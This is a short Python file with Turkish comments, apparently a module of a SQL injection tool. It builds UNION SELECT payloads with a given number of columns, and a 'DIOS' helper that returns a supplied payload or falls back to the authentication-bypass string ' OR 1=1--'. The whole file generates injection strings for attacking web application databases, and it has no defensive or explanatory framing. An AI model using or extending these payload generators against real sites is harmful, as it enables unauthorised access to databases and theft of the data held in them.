def generate_union_columns(count: int) -> str:
    """
    count = 3  ->  "1,2,3"
    """
    if count < 1:
        count = 1
    return ",".join(str(i) for i in range(1, count + 1))


def generate_union_payload(count: int, comment: str = "--") -> str:
    """
    count = 3  ->  "UNION SELECT 1,2,3--"
    """
    cols = generate_union_columns(count)
    return f"UNION SELECT {cols}{comment}"


def dios_payload(payloads: list[str]) -> str:
    """
    DIOS modu:
    - payload listesi varsa ilkini döndürür
    - yoksa güvenli fallback
    """
    if payloads:
        return payloads[0]
    return "' OR 1=1--"
